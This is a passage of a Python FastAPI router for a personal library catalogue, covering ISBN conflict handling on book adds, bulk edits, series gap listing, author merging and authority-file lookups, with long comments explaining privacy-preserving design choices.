            # three answered **201**, purging one row and adding a stray fourth
            # beside the two that still held the ISBN.
            #
            # Ordered live-first so the row named in a 409 is the one on the
            # shelf rather than one in the trash.
            holders = (
                whole_table_for_uniqueness(db)
                .filter(Book.isbn.in_(forms))
                .order_by(Book.deleted_at.isnot(None), Book.id)
                .all()
            )
            # Decided in full before anything is destroyed. `_purge` is not
            # undoable by the request failing: it used to unlink the cover file
            # itself, so a 409 raised half way through a group left a member
            # holding a book whose cover was gone. That unlink now happens
            # after the commit, and this loop is what makes sure there is
            # nothing to undo in the first place.
            blocker = next(
                (holder for holder in holders if not _freeable(holder, current_user)),
                None,
            )
            if blocker is not None:
                raise HTTPException(
                    status_code=status.HTTP_409_CONFLICT,
                    detail=_conflict_detail(conflict, blocker, current_user),
                )
            freed = [_purge(holder, db) for holder in holders]
            if freed:
                # Flushed, not committed: this function owns the transaction
                # and commits once. Without this the DELETEs are still pending
                # when the INSERT runs and the unique ISBN index rejects it,
                # which is the whole thing this avoids.
                db.flush()

    fields = payload.model_dump()
    # Popped before the constructor: `Book.classifications` is a relationship,
    # so handing it a list of plain dicts raises rather than building rows.
    # The validated models on `payload` are what the rows are written from.
    fields.pop("classifications", None)
    book = Book(**fields, added_by_user_id=current_user.id)
    db.add(book)
    # Before the commit, so a book and the headings it was added with land in
    # one transaction: a failure here must not leave a book claiming a
    # provenance no row records.
    add_headings(book, payload.classifications, db)
    db.commit()
    db.refresh(book)

    # After the commit, and before the new book's own cover is stored. SQLite
    # reuses the id of a deleted row, so the book just inserted may well have
    # taken one of these: forgetting here is what stops it inheriting somebody
    # else's cover, and doing it after `_store_cover` would delete its own.
    for book_id in freed:
        covers.forget(book_id)

    # After the commit, because the cover is stored under the book's id and the
    # id does not exist until the row does. A failed fetch is not a failed add:
    # `store_cover` returns the remote URL, or leaves the book without one.
    if _store_cover(book):
        db.commit()
        db.refresh(book)
    return book_to_out(book, current_user, db)


def _conflict_detail(message: str, holder: Book, current_user: User) -> str | dict[str, object]:
    """The 409 body for a book whose ISBN is already taken.

    Re-scanning a book already on the shelf is not a rare mistake, it is what
    happens on the second pass through a bookcase. Answering it with a bare
    sentence leaves the reader holding the book with nothing to press: they
    have to go and find it themselves to check it really is the same edition.
    So the id travels with the message and the UI offers to open it.

    **Only when the holder is visible to the caller.** The uniqueness check
    deliberately sees every row, private ones included, so returning the id
    unconditionally would turn a 409 into a way to confirm that a particular
    member owns a particular book, which is exactly what `is_private` promises
    it will not do. In that case the message goes back on its own, and it is
    the same message, so the response does not disclose which case it was.
    """
    if holder.is_private and holder.added_by_user_id != current_user.id:
        return message
    # `book_id` is what the client offers two actions on: opening the book it
    # already has (a mis-scan, the common case) and adding another copy of it
    # (`POST /api/books/{book_id}/copies`). Both need the id and neither may
    # have it when the holder is somebody else's private book.
    return {"message": message, "book_id": holder.id}


def _freeable(holder: Book, current_user: User) -> bool:
    """Whether a trashed row may be cleared out of the way of a book being
    added again.

    Without this, deleting a book and re-scanning it reports "already exists"
    for a book the member cannot see anywhere, which is a worse bug than the
    one soft deletion fixes. `implementation.md` names mis-scan, delete,
    re-scan as the most common delete in this app, so it is also the common
    path rather than a corner.

    Purged rather than restored, so the outcome matches what deleting and
    re-adding has always done here: a fresh record. Restoring instead would
    silently hand back the record somebody had just rejected, which is exactly
    what a person who deleted it because its metadata was wrong does not want.
    Losing the undo window costs nothing: they are holding the book and adding
    it right now.

    **Only a row this member could have seen in their own trash.** Purging
    somebody else's trashed private book because their ISBN happened to match
    would destroy data they never offered up, and would confirm the book
    existed. That case keeps the 409.

    **A predicate and nothing else**, deliberately. It used to purge as well,
    which meant the caller could only ask about one row at a time without
    destroying it: see the note at the call site for what that cost once one
    ISBN could be held by several rows.
    """
    if holder.deleted_at is None:
        return False
    return not holder.is_private or holder.added_by_user_id == current_user.id


@router.post("", response_model=BookOut, status_code=status.HTTP_201_CREATED)
def add_book(payload: BookCreate, db: DbSession, current_user: CurrentUser) -> BookOut:
    return _create_book(payload, current_user, db, "Book with this ISBN already exists")


@router.post("/scan", response_model=BookOut, status_code=status.HTTP_201_CREATED)
def scan_add(payload: BookCreate, db: DbSession, current_user: CurrentUser) -> BookOut:
    """Confirm-add after an ISBN lookup. Same as POST /api/books, named for the
    scan flow so the client's intent is visible in logs and metrics."""
    return _create_book(payload, current_user, db, "Book with this ISBN already in catalog")


# ── Ownership ─────────────────────────────────────────────────────────────────
#
# Whether a copy is physically on the shelf, which is a fact about the object
# and not about any one reader. See OwnershipStatus for why it is separate from
# reading status.


@router.post("/bulk", response_model=BulkResult)
def bulk_action(
    payload: BulkRequest,
    db: DbSession,
    current_user: CurrentUser,
) -> BulkResult:
    """Apply one verb to a selection of books.

    One endpoint rather than six, because every verb shares the same three
    steps: resolve the ids the caller may actually touch, apply, and report
    updated/unchanged/skipped. Six handlers would be six copies of the
    permission walk, and the fifth one added would be the one that forgot it.

    A separate `/bulk/ownership` used to sit beside this with the same body,
    the same permission walk and an identical result shape. It was removed
    rather than carried into the first tagged release: two endpoints for one
    action is two places for the next change to have to land, and dropping one
    after a release is a breaking change rather than a tidy-up.
    """
    requested = set(payload.book_ids)
    books = Shelf.seen_by(db, current_user.id).where(Book.id.in_(requested)).all()
    # Skipped covers both halves of "not yours to change": ids that do not
    # exist and ids belonging to somebody else's private book. Distinguishing
    # them in the response would disclose which of the two it was.
    skipped = len(requested) - len(books)

    handler = _BULK_HANDLERS[payload.action]
    updated, unchanged = handler(db, books, payload.value, current_user)

    db.commit()
    return BulkResult(updated=updated, unchanged=unchanged, skipped=skipped)


def _bulk_add_tag(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    tag = _require_tag(db, value)
    updated = unchanged = 0
    for book in books:
        if any(existing.id == tag.id for existing in book.tags):
            unchanged += 1
        else:
            book.tags.append(tag)
            updated += 1
    return updated, unchanged


def _bulk_remove_tag(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    tag = _require_tag(db, value)
    updated = unchanged = 0
    for book in books:
        match = next((existing for existing in book.tags if existing.id == tag.id), None)
        if match is None:
            unchanged += 1
        else:
            book.tags.remove(match)
            updated += 1
    return updated, unchanged


def _bulk_set_status(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    try:
        new_status = ReadStatus(str(value))
    except ValueError:
        raise HTTPException(status_code=422, detail=f"{value!r} is not a reading status") from None

    # One statement for the selection, the same stamping the single-book route
    # uses, and the unchanged rule: all three on `Reading.mark_each`.
    return Reading.by(db, current_user.id).mark_each(
        [book.id for book in books], new_status
    )


def _bulk_set_ownership(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    try:
        new_ownership = OwnershipStatus(str(value))
    except ValueError:
        raise HTTPException(
            status_code=422, detail=f"{value!r} is not an ownership status"
        ) from None

    updated = unchanged = 0
    for book in books:
        if book.ownership == new_ownership:
            unchanged += 1
        else:
            book.ownership = new_ownership
            updated += 1
    return updated, unchanged


def _bulk_set_location(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    # An empty string clears the location, which is how a box gets unpacked.
    location = str(value).strip() if value is not None else ""
    if len(location) > 120:
        raise HTTPException(status_code=422, detail="Location is too long")
    new_location = location or None

    updated = unchanged = 0
    for book in books:
        if book.location == new_location:
            unchanged += 1
        else:
            book.location = new_location
            updated += 1
    return updated, unchanged


def _bulk_set_collection(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    """File a selection into a collection, or unfile it.

    None and the empty string both clear, matching `_bulk_set_location`: a
    verb that can only add is a verb somebody has to undo one book at a time.
    An unknown id is a 400 from `_checked_collection` and changes nothing,
    because the whole selection is applied in one transaction.
    """
    if value is None or str(value).strip() == "":
        new_collection: int | None = None
    else:
        try:
            new_collection = int(str(value))
        except ValueError:
            raise HTTPException(
                status_code=422, detail="A collection id is required"
            ) from None
        _checked_collection(db, new_collection)

    updated = unchanged = 0
    for book in books:
        if book.collection_id == new_collection:
            unchanged += 1
        else:
            book.collection_id = new_collection
            updated += 1
    return updated, unchanged


def _bulk_delete(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    """Trash a selection. The same reversible delete as the single-book route.

    Bulk is where an accident is most expensive: this is the verb that runs
    against a few hundred selected rows at once.
    """
    for book in books:
        _trash(book, db)
    return len(books), 0


def _require_tag(db: Session, value: str | int | None) -> Tag:
    try:
        tag_id = int(str(value))
    except (TypeError, ValueError):
        raise HTTPException(status_code=422, detail="A tag id is required") from None
    tag = db.get(Tag, tag_id)
    if tag is None:
        raise HTTPException(status_code=404, detail="Tag not found")
    return tag


_BULK_HANDLERS: dict[
    BulkAction, Callable[[Session, list[Book], str | int | None, User], tuple[int, int]]
] = {
    BulkAction.ADD_TAG: _bulk_add_tag,
    BulkAction.REMOVE_TAG: _bulk_remove_tag,
    BulkAction.SET_STATUS: _bulk_set_status,
    BulkAction.SET_OWNERSHIP: _bulk_set_ownership,
    BulkAction.SET_LOCATION: _bulk_set_location,
    BulkAction.SET_COLLECTION: _bulk_set_collection,
    BulkAction.DELETE: _bulk_delete,
}


# ── Browsing by series and by shelf ───────────────────────────────────────────
#
# Declared before /{book_id}, like /export above: FastAPI matches in
# declaration order, so the reverse order makes each of these a request for the
# book with id "series".


@router.get("/series", response_model=list[SeriesOut])
def list_series(db: DbSession, current_user: CurrentUser) -> list[SeriesOut]:
    """Every series on the shelf, with the gaps in it.

    "Which ones are we missing" is the question a series view exists to answer,
    and it is answered here rather than in the client so the whole catalogue is
    considered rather than the current page.
    """
    rows = (
        Shelf.seen_by(db, current_user.id)
        .select(Book.series_name, Book.series_index)
        .filter(Book.series_name.isnot(None))
        .all()
    )

    # Counts and indexes tracked separately: a series can hold books nobody has
    # numbered, and counting the indexes would report such a series as empty.
    counts: dict[str, int] = {}
    indexes: dict[str, set[int]] = {}
    for name, index in rows:
        counts[name] = counts.get(name, 0) + 1
        indexes.setdefault(name, set())
        # Only whole numbers participate in the gap calculation. A 2.5 novella
        # is not a missing volume and must not make 2 or 3 look absent.
        if index is not None and float(index).is_integer():
            indexes[name].add(int(index))

    result: list[SeriesOut] = []
    for name in sorted(counts):
        held = indexes[name]
        # Only gaps *below* the highest number held. A series with no known
        # length has no meaningful "missing" past the end, and reporting one
        # would invent a book nobody has said exists.
        missing = sorted(set(range(1, max(held) + 1)) - held) if held else []
        result.append(
            SeriesOut(name=name, book_count=counts[name], missing_indexes=missing)
        )
    return result


# ── Authors ───────────────────────────────────────────────────────────────────
#
# Declared here, above `/{book_id}`, for the reason `/series` and `/export` are:
# FastAPI matches in declaration order, so `/authors` written after `/{book_id}`
# is a request for the book with id "authors".
#
# There is no author table. An author is a name inside `books.author`, and these
# endpoints group the column exactly as `list_series` groups `series_name`. The
# one thing that is stored is `author_aliases`, which holds decisions rather than
# data: see `models.AuthorAlias` and `docs/decisions.md`.
#
# Everything below is a thin call into `authorship.py`, which owns both halves of
# author identity: the pure rules in `authors.py` and the queries and writes that
# used to sit here. The 404-not-403 rule is the one thing these handlers still
# do themselves, because it is an HTTP answer rather than a rule about names.

def _author_not_found() -> HTTPException:
    """Absent and forbidden reported identically, exactly as
    `dependencies._not_found` does for a book: a 403 would confirm that
    somebody owns a book by that name.

    A fresh instance per raise, for the reason that function records.
    """
    return HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Author not found")


@router.get("/authors", response_model=list[AuthorOut])
def list_authors(db: DbSession, current_user: CurrentUser) -> list[AuthorOut]:
    """Everybody credited on the shelf, with what the shelf knows about them.

    Unpaginated, like `/series` and `/locations`. The page it backs is a browse
    of the whole catalogue and filters in the browser, so paging it would trade
    a list nobody scrolls for a request per keystroke. One entry per name, each
    a name, a count and the spellings behind it, which is a smaller payload per
    row than `/duplicates` already returns unpaginated with a whole `BookOut`
    per book.
    """
    return Authorship.seen_by(db, current_user.id).listing()


@router.get("/authors/suggestions", response_model=list[AuthorSuggestionOut])
def list_author_suggestions(
    db: DbSession, current_user: CurrentUser
) -> list[AuthorSuggestionOut]:
    """Names that are probably one person.

    A suggestion and never a verdict: it is offered because accepting one
    writes an alias row and deleting that row puts the shelf back exactly as it
    was. `authors.suggest_merges` records which rule produced each group so a
    reader can tell a near-certainty from a guess before pressing anything.
    """
    return Authorship.seen_by(db, current_user.id).suggestions()


@router.get("/authors/wikipedia", response_model=list[AuthorWikipediaOut])
async def author_wikipedia(
    db: DbSession,
    current_user: CurrentUser,
    lang: Locale = Locale.EN,
) -> list[AuthorWikipediaOut]:
    """An outward Wikipedia link per author, in the reader's language.

    **Declared before `/authors/{...}` would be**, the same route ordering trap
    the comment above records: FastAPI matches in declaration order.

    ## The gate is identity, not language

    One row per author that carries a **confirmed Wikidata identifier**, and no
    row for anybody else. That is what makes "if it is available" a property of
    the shelf rather than of the network, and it is the whole reason this is
    safe: #87 measured two GND records spelled `Stevenson, Robert Louis` of
    which only one has a Wikidata item, and a biography attached to the wrong
    one is worse than no biography. `Authorship.listing()` is what filters the
    identifiers by `visible_to`, so this cannot announce an author only visible
    on somebody else's private book.

    ## `lang` is the app's locale and never the browser's

    A `Locale`, so the closed set is the server's and an unknown value is a 422
    rather than a `sitefilter` this app did not write. It is what the reader
    chose in Settings, which is the owner's first rule on #89 and is exactly
    what `Accept-Language` would get wrong: a German browser reading the app in
    English would be sent to German Wikipedia.

    The other locale follows it, so a reader gets their own language, then the
    app's other one, then any edition at all, then the Wikidata item.

    ## What it costs, and it is bounded rather than proportional to the shelf

    **At most ten requests**, and the two halves are sized separately because
    they are different shapes. Five filtered, `ceil(n / 50)` where `n` is the
    confirmed authors capped by `authority.MAX_WIKIPEDIA_ITEMS` at 250: fifty
    ids with `sitefilter=dewiki|enwiki` measured 15,034 bytes and 0.89s on
    2026-08-28. Five unfiltered, for the authors with no article in either app
    locale, at two ids each because one unfiltered entity reaches 64,449 bytes,
    which is `Q692` and 336 sitelinks. About **720 KB** all told. A library that
    has confirmed nobody makes **no
    request at all**, and the client is expected not to call this then.

    **The same limiter as the authority lookups, on purpose.** It is the counter
    for "this member is asking authority services things", and sharing it means
    somebody reloading this page cannot also be spending the confirmation
    budget. The alternative, a counter of its own, would let the two add up
    against one supplier.

    Never 503, and that is the difference between this and
    `GET /authors/authority`. Nothing here is a supplier: a Wikidata outage
    turns every row into a link to the Wikidata item, which still names the
    right person, so the button is present either way. See
    `authority.wikipedia_articles`.
    """
    authority_limiter.check(current_user.username)
    items: dict[str, str] = {}
    for author in Authorship.seen_by(db, current_user.id).listing():
        for row in author.identifiers:
            if row.scheme is AuthorityScheme.WIKIDATA:
                items[author.key] = row.identifier
                break
    if not items:
        return []

    # The reader's own language first, then the app's other one. Derived from
    # the enum rather than written out, so a third locale is translated and
    # linked in one edit instead of being translated and silently unlinked.
    prefer = (lang.value, *(other.value for other in Locale if other is not lang))
    found = await authority.wikipedia_articles(
        tuple(items.values()),
        prefer=prefer,
        deadline=authority.deadline_from_now(),
    )
    return [
        AuthorWikipediaOut(key=key, url=article.url, language=article.language)
        for key, item in items.items()
        if (article := found.get(item)) is not None
    ]


@router.post("/authors/merge", response_model=AuthorOut)
def merge_authors(
    payload: AuthorMergeRequest, db: DbSession, current_user: CurrentUser
) -> AuthorOut:
    """Say that these spellings are one person.

    **Nothing in `books` is written.** Every named author keeps its credit line
    exactly as printed, and what changes is one row per spelling saying who
    that spelling means. Deleting the row undoes it, and a later import that
    re-creates the spelling is folded by the row that is already there.

    Any member, like creating and renaming a collection, and for the same
    reason: it is reversible, and a shelf only an admin can tidy is one nobody
    tidies. Unlike deleting a collection, which is admin only because it
    strips a label off every book with no undo.

    An author nobody can see is **404, not 403**, exactly as a private book is:
    a 403 would confirm that somebody owns a book by that name.

    A `keep_name` that no book carries is allowed and is the point: "Le Guin,
    Ursula K." splits into two people, neither spelled correctly, and the
    repair is a name typed by hand. One that is itself already folded into
    somebody resolves to that somebody, so the mapping stays one lookup deep.

    How that is carried out is `authorship.Authorship.merge`.
    """
    try:
        return Authorship.seen_by(db, current_user.id).merge(
            payload.keys, payload.keep_name, by_user_id=current_user.id
        )
    except AuthorNotFound:
        raise _author_not_found() from None


@router.delete("/authors/aliases/{alias_id}", status_code=status.HTTP_204_NO_CONTENT)
def unmerge_author(alias_id: RowId, db: DbSession, current_user: CurrentUser) -> None:
    """Undo one merge. The spelling becomes its own author again.

    This is why merging is allowed to guess. Nothing was rewritten, so removing
    the row restores exactly the state before it was written, and the books
    were never involved.

    A row whose spelling is on no book this caller can see is **404**, and the
    reason is authority rather than secrecy: undo what you can see the effect
    of. The page offers this beside the spelling it folded, so a row with no
    such spelling on your shelf has no button here and no meaning here either.

    That leaves an **orphan** alias, whose spelling is on nobody's shelf because
    the book was deleted, unreachable and undeletable. Accepted: it maps a name
    nothing is credited with, so it changes no view, and it starts working again
    by itself if an import re-creates that spelling, which is the property the
    whole design is for.

    How that is carried out is `authorship.Authorship.unmerge`.
    """
    try:
        Authorship.seen_by(db, current_user.id).unmerge(alias_id)
    except AuthorNotFound:
        raise _author_not_found() from None


def _with_refusals(
    out: BookOut, recorded: RecordedAssertions
) -> BookOut:
    """The Book, carrying what a catalogue asserted and this Library declined.

    `model_copy` rather than a parameter on `book_to_out`: twenty call sites
    build a `BookOut` and two of them can ever have something to report, so the
    fact is attached where it arises instead of threaded through everything.
    """
    if not recorded.refused:
        return out
    return out.model_copy(
        update={
            "refused_identifiers": [
                RefusedAssertionOut(
                    name=row.name,
                    scheme=row.scheme,
                    asserted=row.asserted,
                    kept=row.kept,
                    kept_provenance=row.kept_provenance,
                )
                for row in recorded.refused
            ]
        }
    )


def _authority_out(candidate: authority.AuthorityCandidate) -> AuthorityCandidateOut:
    """One authority record as the API serves it."""
    return AuthorityCandidateOut(
        scheme=candidate.scheme,
        identifier=candidate.identifier,
        name=candidate.name,
        variants=list(candidate.variants),
        born=candidate.born,
        died=candidate.died,
        same_as=list(candidate.same_as),
        certain=candidate.certain,
        wikidata_id=candidate.wikidata_id,
        description=candidate.description,
        disagreements=[
            AuthorityDisagreementOut(
                about=row.about, lobid=row.lobid, wikidata=row.wikidata
            )
            for row in candidate.disagreements
        ],
    )


@router.get("/authors/authority", response_model=list[AuthorityCandidateOut])
async def author_authority(
    db: DbSession,
    current_user: CurrentUser,
    author: Annotated[
        str,
        Query(
            min_length=1,
            max_length=AUTHOR_NAME_MAX,
            description="An author key, or any spelling of the name",
        ),
    ],
    q: Annotated[
        str | None,
        Query(
            min_length=1,
            max_length=AUTHOR_NAME_MAX,
            description=(
                "Search the authority file for this name instead of the "
                "author's own. Forces the name search route."
            ),
        ),
    ] = None,
) -> list[AuthorityCandidateOut]:
    """What the authority files say about this author.

    **Two routes, and which one ran is on every row as `certain`.** Where a
    catalogue record for one of this author's Books already asserted a GND
    number, that number is a key: it resolves to exactly one record, and the
    spelling on it is the suggestion this feature exists to offer. Where it did
    not, the author's name is put to a name search, and a name is not a key.
    Two people are spelled `Stevenson, Robert Louis` in the GND.

    **`q` steers that search and forces it.** Without it the query is the
    author's own display name, which is exactly wrong when the shelf spells
    somebody in a form the GND does not use: the search then answers with the
    wrong people and there is no way to retype it. This is the one shape
    decision worth making before a client exists, because a client built
    against the narrower version would have to change to gain it.

    **Nothing here writes, on either route.** A suggestion is offered and may be
    overruled, which was settled on 2026-08-24: suggest the authority's spelling
    and let it be overwritten, while storing the reference either way. Taking a
    suggested spelling is `POST /authors/merge`, which already accepts a name
    typed by hand. Confirming an identifier from a name search is
    `POST /authors/identifiers`, which records that a person chose it.

    **Nothing here is stored either**, and most of it has no column to be
    stored in. The dates and the one line description are there so somebody can
    tell two same named people apart while they decide.
    `docs/featurelist.md` refuses author biographies and portraits, and this is
    the identity half of that line rather than an exception to it.

    An author nobody can see is **404, not 403**, exactly as a private book is.
    503 where the authority file could not be reached: nothing in this feature
    is blocked by it, so the client can offer "try again" rather than an error
    page.
    """
    # Its own limiter, not the catalogues'. lobid publishes 30 complex searches
    # a minute for its whole service and `METADATA_LIMIT` is 60 per member: see
    # `ratelimit.AUTHORITY_LIMIT`.
    authority_limiter.check(current_user.username)
    authorship = Authorship.seen_by(db, current_user.id)
    try:
        stored = authorship.identifiers_for(author)
    except AuthorNotFound:
        raise _author_not_found() from None

    # **One deadline for the whole lookup, and a ceiling on the fan out.**
    # Both were missing and the resolve branch had neither: it is one candidate
    # per identifier stored for the person, which is one per spelling folded
    # into them, and `fetch.get_once` gives every call its own budget when it is
    # passed none. `authority.DEADLINE_SECONDS` carries the measurement.
    deadline = authority.deadline_from_now()
    try:
        if q is not None:
            # A retyped name is a search whatever is stored: the member is
            # saying the shelf spelling is not the one to look up.
            found = await authority.search(q, deadline=deadline)
        elif stored:
            # One row per scheme per spelling. `resolve` answers None for a
            # number the file does not hold, which a hand edited row or a
            # retired GND record can produce.
            found = [
                candidate
                for candidate in await asyncio.gather(
                    *(
                        authority.resolve(row.identifier, deadline=deadline)
                        for row in stored[: authority.MAX_CANDIDATES]
                    )
                )
                if candidate is not None
            ]
        else:
            found = await authority.search(
                authorship.display_name(author), deadline=deadline
            )
    except authority.AuthorityUnavailable:
        raise HTTPException(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
            detail=(
                "Could not reach the authority file. Try again in a moment, or "
                "leave the name as it is."
            ),
        ) from None

    return [_authority_out(row) for row in found]


def _identifier_out(row: AuthorIdentifier, spelling: str) -> AuthorIdentifierOut:
    """One stored identifier as the API serves it.

    **The stored key's own spelling, never what the caller sent.** A client
    holds `AuthorOut.key` and posts it, so echoing the payload put
    `le guin ursula k` in a field whose own docstring says it is not the key.
    `Authorship` files the row under a spelling the shelf carries, and that is
    what a reader needs to see.
    """
    return AuthorIdentifierOut(
        id=row.id,
        spelling=spelling,
        scheme=row.scheme,
        identifier=row.identifier,
        provenance=row.provenance,
    )


async def _cross_references_for(identifier: str) -> dict[AuthorityScheme, str]:
    """What the confirmed GND record says this person is called elsewhere.

    **Resolved by the server, never read off the request body.** The rule
    `Authorship.record_catalogue_assertions` states, applied here because this
    is the other write that can reach `author_identifiers`: a client that could
    post its own cross references would launder typed numbers into rows that
    read like a national library's assertion. `payload.identifier` is the only
    thing the caller contributes and it is a key, so exactly one record can
    answer to it.

    **Two sources, and the second is the one that costs a request.** The GND
    record's own `sameAs` carries ISNI, LCNAF, VIAF and Wikidata, which
    `authority.cross_references` reads off a response already in hand. It
    carries **no national library number**, so the six that a reader of Spanish,
    Portuguese, Brazilian, Argentine, Italian or Chilean books wants come from
    the VIAF cluster that record names, through
    `authority.national_identifiers`.

    **The two are disjoint, and the `|` below is only a merge while they are.**
    `_CROSS_REFERENCE_URIS` holds four schemes and `_NATIONAL_SOURCES` the other
    six, and `national_identifiers` never returns a VIAF cluster id, so no key
    can appear on both sides.
    `tests/test_authority.py::TestTheEnumAndTheParserDescribeOneSet` pins that
    rather than leaving it to be noticed.

    **It is load bearing rather than tidy, because Python's `|` gives the right
    operand priority and the right operand is the wrong one to prefer.** An
    overlap would let the VIAF cluster's value silently overwrite the one lobid
    asserted and Wikidata confirmed, which is resolution by precedence in favour
    of the only source of the three that was never cross checked. An earlier
    version of this paragraph said "the free ones win a collision", which is the
    operand order backwards: they are on the left.

    **Never raises, and an empty mapping is an ordinary answer.** The
    confirmation is already committed by the time this runs and it is what the
    Member asked for; the cross references are what came with it. A lobid
    outage, a VIAF outage, a superseded number, or a record carrying none of
    them all produce the same nothing, and none of them is a reason to fail a
    write that succeeded.

    One deadline for both, so a slow VIAF cannot buy itself the resolve's unused
    budget on top of its own.
    """
    deadline = authority.deadline_from_now()
    try:
        candidate = await authority.resolve(identifier, deadline=deadline)
    except authority.AuthorityUnavailable:
        logger.info("Could not resolve a confirmed identifier for its cross references")
        return {}
    if candidate is None:
        return {}
    return authority.cross_references(candidate) | await authority.national_identifiers(
        candidate, deadline=deadline
    )


@router.post(
    "/authors/identifiers",
    response_model=ConfirmedIdentifierOut,
    status_code=status.HTTP_201_CREATED,
)
async def confirm_author_identifier(
    payload: AuthorIdentifierRequest,
    db: DbSession,
    current_user: CurrentUser,
) -> ConfirmedIdentifierOut:
    """Confirm that a candidate authority identifier is this author's.

    **This endpoint exists because a name is not a key.** An identifier on the
    record a catalogue returned for a Book's own ISBN is a cataloguer's
    assertion about that Book and is stored without asking, by `refresh` and
    `enrich`. One found by searching an authority file by name is a candidate:
    two authors share a name and one author has five spellings, so storing it
    silently would merge two people behind somebody's back. It reaches the store
    only through here, and the row records that a person chose it.

    **409, not 422, where the spelling already carries a different value.** The
    request is well formed and the state is what refuses it. Retyping an
    identifier is the one operation this store has no verb for: correcting a
    wrong one is `DELETE`, and a re-import may put it back.

    **Confirming a GND number stores the cross references that came with it.**
    A person confirms a *record*, and that record already asserts this person's
    ISNI, LCNAF number, VIAF cluster and Wikidata item. All four used to be
    shown once by `GET /authors/authority` and dropped. They are re-read from
    the record here rather than taken from the request, which is the only shape
    that keeps a client from writing its own.

    **And the six national library numbers, which cost the extra requests.** The
    GND record carries none of them; the VIAF cluster it names carries all six.

    **A confirmation is up to eight outbound requests**, and the count is worth
    stating because `ratelimit.AUTHORITY_LIMIT` is sized against it: one lobid
    record, **four to Wikidata** (`resolve` compares `P214` and `P213` on this
    branch, so `_cross_check` is the item lookup, the description and two
    claims), and up to three to VIAF. Only the last three are new here; the
    first five are what confirming already cost. The third VIAF call is paid
    only on a 5xx, so the ordinary confirmation is seven.

    An earlier version of this paragraph said "one lobid request plus up to
    three VIAF ones", which counted two of the three hosts. See
    `authority.national_identifiers`, and `authority.DEADLINE_SECONDS` for the
    time budget all of it shares.

    **Only for `gnd`.** It is the one scheme this app can resolve, and a
    confirmation under any other is a number a Member typed with no record
    behind it to read cross references off. Nothing is fetched for those and
    `cross_references` comes back empty.

    **A cross reference colliding with a stored value is reported, not raised.**
    The confirmation succeeded and is what the Member asked for; refusing it
    afterwards because a fact that arrived alongside it disagrees would undo the
    thing they came to do. A collision on the confirmed identifier itself is the
    opposite case and is the 409 above.

    An author nobody can see is **404, not 403**, exactly as a private book is.
    """
    # The same limiter the search route uses, because this request now reaches
    # lobid too: without it, a client posting the same confirmation in a loop
    # makes an outbound request per call under no budget at all.
    authority_limiter.check(current_user.username)
    authorship = Authorship.seen_by(db, current_user.id)
    try:
        row = authorship.confirm_identifier(
            payload.author,
            payload.scheme,
            payload.identifier,
            by_user_id=current_user.id,
        )
    except AuthorNotFound:
        raise _author_not_found() from None
    except IdentifierConflict:
        raise HTTPException(
            status_code=status.HTTP_409_CONFLICT,
            detail="That spelling already carries a different identifier. Remove it first.",
        ) from None

    references = (
        await _cross_references_for(payload.identifier)
        if payload.scheme is AuthorityScheme.GND
        else {}
    )
    recorded = RecordedAssertions(stored=[], refused=[])
    if references:
        try:
            recorded = authorship.record_cross_references(
                payload.author, references, by_user_id=current_user.id
            )
        except AuthorNotFound:
            # Unreachable through this handler: `confirm_identifier` resolved
            # the same name a moment ago. Caught rather than trusted, because
            # the confirmation is already committed and a 404 here would report
            # a write that did happen as one that did not.
            logger.info("An author resolved for a confirmation and not for its siblings")

    spelling = authorship.spelling_for(row.author_key)
    return ConfirmedIdentifierOut(
        identifier=_identifier_out(row, spelling),
        cross_references=[
            _identifier_out(stored, authorship.spelling_for(stored.author_key))
            for stored in recorded.stored
        ],
        refused=[
            RefusedAssertionOut(
                name=refused.name,
                scheme=refused.scheme,
                asserted=refused.asserted,
                kept=refused.kept,
                kept_provenance=refused.kept_provenance,
            )
            for refused in recorded.refused
        ],
    )


@router.delete(
    "/authors/identifiers/{identifier_id}", status_code=status.HTTP_204_NO_CONTENT
)
def forget_author_identifier(
    identifier_id: RowId, db: DbSession, current_user: CurrentUser
) -> None:
    """Remove a wrong identifier. A later import may write it again.

    **The only correction there is**, and it is deliberately destructive rather
    than an edit: an upstream cluster can be wrong, and a fact that cannot be
    corrected is a trap. What is refused is retyping it to a different value,
    because that is the operation that turns somebody's guess into something
    that reads like a national library's assertion.

    A row whose spelling is on no book this caller can see is **404**, for the
    reason `unmerge_author` gives: authority rather than secrecy.

    How that is carried out is `authorship.Authorship.forget_identifier`.
    """
    try:
        Authorship.seen_by(db, current_user.id).forget_identifier(identifier_id)
    except AuthorNotFound:
        raise _author_not_found() from None


# ── Shelf locations ───────────────────────────────────────────────────────────


@router.get("/locations", response_model=list[LocationOut])
def list_locations(db: DbSession, current_user: CurrentUser) -> list[LocationOut]:
    """The distinct shelf locations in use, most-populated first.

    Doubles as the autocomplete source for the location field. Free text with
    no suggestions turns into six spellings of "living room" within a week.
    """
    rows = (
        Shelf.seen_by(db, current_user.id)
        .select(Book.location, func.count(Book.id))
        .filter(Book.location.isnot(None), Book.location != "")
        .group_by(Book.location)
        .order_by(func.count(Book.id).desc(), Book.location)
        .all()
    )
    return [LocationOut(name=name, book_count=count) for name, count in rows]


@router.get("/classifications", response_model=ClassificationFacets)
def list_classifications(
    db: DbSession, current_user: CurrentUser
) -> ClassificationFacets:
    """Every heading in the library and every Dewey division, each with a count.

    The source for the classification filter panel, and the counterpart of
    `/tags` and `/locations`. Ordered here so the response is deterministic:
    headings by scheme then number, divisions by number, both ascending, which
    for Dewey is shelf order and for a subject vocabulary is at least stable.
    The order a reader sees is the client's, as it is for tags.

    **The counting is the shelf's**, and this handler deliberately holds none of
    it. A row in `classifications` carries no member, so nothing about it says
    who may see it, and a facet list built here with a bare query would publish
    the subject headings of other people's private reading without returning a
    single Book. `Shelf.classification_facets` applies the viewer's predicate by
    construction, and `tests/test_shelf.py` names this exact disclosure as the
    reason its fourth pass exists.
    """
    headings, divisions = Shelf.seen_by(db, current_user.id).classification_facets()
    return ClassificationFacets(
        headings=sorted(
            (
